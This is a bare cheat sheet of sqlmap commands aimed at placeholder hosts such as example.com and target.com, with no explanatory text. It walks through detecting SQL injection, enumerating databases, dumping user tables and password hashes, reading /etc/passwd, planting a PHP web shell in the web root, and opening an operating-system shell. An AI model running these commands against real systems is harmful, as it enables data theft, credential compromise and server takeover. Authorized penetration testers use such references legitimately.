```
sqlmap -h
sqlmap -hh
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
sqlmap -r req.txt
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u www.target.com --data='id=1' --method PUT
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
sqlmap -u www.example.com/?id=1 -v 3 --level=5
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
sqlmap -u "http://www.example.com/?id=1" --schema
sqlmap -u "http://www.example.com/?id=1" --search -T user
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
sqlmap --list-tampers
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
